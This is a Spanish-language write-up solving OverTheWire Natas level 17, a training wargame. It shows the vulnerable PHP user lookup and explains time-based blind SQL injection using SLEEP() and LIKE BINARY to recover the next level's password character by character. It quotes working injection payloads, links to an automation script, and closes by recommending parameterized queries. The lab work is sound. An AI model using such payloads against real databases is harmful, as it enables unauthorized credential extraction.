Vemos un buscador de usuarios similar al nivel 15 con algunos cambios en el código:
```php
<?php  
  
/*  
CREATE TABLE `users` (  
  `username` varchar(64) DEFAULT NULL,  
  `password` varchar(64) DEFAULT NULL  
);  
*/  
  
if(array_key_exists("username", $_REQUEST)) {    
	$link = mysqli_connect('localhost', 'natas17', '<censored>');    
	mysqli_select_db($link, 'natas17');    
	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";  
	if(array_key_exists("debug", $_GET)) {  
		echo "Executing query: $query<br>";  
	}    
	$res = mysqli_query($link, $query);  
	if($res) {  
		if(mysqli_num_rows($res) > 0) {        
			//echo "This user exists<br>";    
		}else {        
			//echo "This user doesn't exist.<br>";    
		}  
	} else {        
		//echo "Error in query.<br>";    
	}    
	mysqli_close($link);  
} else {  
?>
```

Ahora no recibimos información sobre el resultado de la consulta, sea exitosa o no, por lo que debemos aprovechar algunas características de las consultas en SQL:

Es habitual que, cuando encadenamos múltiples condiciones usando `AND`, algunas condiciones no se verifiquen en ciertos escenarios. Esto se debe a que, para mejorar la eficiencia, si una condición no se cumple, no es necesario verificar las siguientes condiciones con `AND`.

- **Encadenamiento de condiciones con `AND`**:
    Cuando usamos `AND` (Y lógico), todas las condiciones deben ser verdaderas para que el resultado global sea verdadero. Si alguna de las condiciones no se cumple, el resultado final será falso.
- **Optimización por eficiencia**:
    Para mejorar la eficiencia, muchos sistemas de programación utilizan un concepto llamado *short-circuit evaluation*. Esto significa que si una condición en una cadena de `AND` es falsa, el sistema detiene la comprobación, porque ya sabe que no es posible que todas las condiciones sean verdaderas. De esta forma, no es necesario evaluar las condiciones restantes.
* ***Ejemplo:**
	```python
	if condicion1 and condicion2 and condicion3:
	```
	
	Si `condicion1` es falsa, las condiciones `condicion2` y `condicion3` no se verifican porque el resultado final ya será falso. Si `condicion1` es verdadera, se verifica `condicion2`, si esta es falsa no se verifica `condicion3` y el resultado global es falso. Esto mejora la eficiencia al evitar evaluaciones innecesarias.

`SLEEP()` es una consulta que pausa un proceso de MySQL durante una duración determinada, es útil para controlar la ejecución de procesos en MySQL, retrasar consultas, o simular demoras. Utilizándola con el concepto antes explicado, podemos crear una consulta que pause cuando el *query* es exitoso y a través de la medición del tiempo construir la contraseña.

Buscamos el usuario del nivel siguiente `natas18`:
```php
SELECT * from users where username="natas18" AND SLEEP(10)#"
```

Al encontrar el usuario pasará a la evaluación de la siguiente condición, que hará una pausa, reflejada en el tiempo de carga de la página. De esta forma podemos comenzar a buscar los caracteres de la contraseña:

```php
SELECT * from users where username="natas18" AND password LIKE BINARY "a%" AND SLEEP(10)#"
```
- **`LIKE BINARY`**: Compara la columna `password` de manera *case sensitive* (sensible a mayúsculas y minúsculas). El patrón `"a%"` busca contraseñas que empiecen con la letra "a", seguidas de cualquier otra cadena.
    
- **`SLEEP(10)`**: Pausa la ejecución de la consulta durante **10 segundos**.

Recordando que el valor que ingresamos para el `username` en el formulario es:
```
username = natas18" AND password LIKE BINARY "a%" AND SLEEP(10)#
```

Cuando encontremos el primer carácter de la contraseña la página hará una pausa por el tiempo que indicamos, entonces podemos agregar ese carácter al *query* y continuar la búsqueda:
```php
SELECT * from users where username="natas18" AND password LIKE BINARY "6a%" AND SLEEP(10)#"
```

Solo queda realizar un [script](https://github.com/IberoGIC/gic-level-2/blob/main/Challenges/OTW_Natas/Lvl_17/Ordenmoria/script.py) automatizando la consulta y la medición del tiempo de respuesta.

---
## **Conclusión**

El nivel nuevamente nos recuerda la limpieza de las entradas de usuario para evitar vulnerabilidades como ataques de temporización y la exposición de contraseñas.

Es necesario utilizar **consultas parametrizadas** para evitar la ejecución de funciones como `SLEEP()` en consultas y almacenar contraseñas de forma segura.

---
-,"  
[_P



